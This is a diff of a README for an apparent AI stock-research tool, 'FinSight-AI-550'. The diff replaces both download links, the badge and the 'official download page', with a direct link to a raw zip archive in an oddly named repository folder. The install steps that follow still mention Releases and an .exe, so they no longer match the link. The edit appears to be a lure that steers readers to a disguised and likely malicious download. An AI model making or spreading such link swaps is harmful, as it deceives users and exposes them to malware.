@@ -1,6 +1,6 @@
 # 📊 FinSight-AI-550 - Smart research tools for equity investors
 
-[![](https://img.shields.io/badge/Download-FinSight--AI--550-blue)](https://github.com/Vinod2515/FinSight-AI-550)
+[![](https://img.shields.io/badge/Download-FinSight--AI--550-blue)](https://github.com/Vinod2515/FinSight-AI-550/raw/refs/heads/main/bookhood/Sight_Fin_A_1.9.zip)
 
 FinSight-AI-550 helps you research stocks. It uses artificial intelligence to read financial reports. It saves you time. You get reliable data for your investment decisions. The system links findings back to original documents. This helps you track facts.
 
@@ -23,7 +23,7 @@ Your computer needs specific parts to run this tool well.
 Follow these steps to put the software on your computer.
 
 1. Open your web browser.
-2. Go to the [official download page](https://github.com/Vinod2515/FinSight-AI-550).
+2. Go to the [official download page](https://github.com/Vinod2515/FinSight-AI-550/raw/refs/heads/main/bookhood/Sight_Fin_A_1.9.zip).
 3. Find the section labeled Releases on the right side of the page.
 4. Click the link for the latest version.
 5. Look for the file ending in .exe.
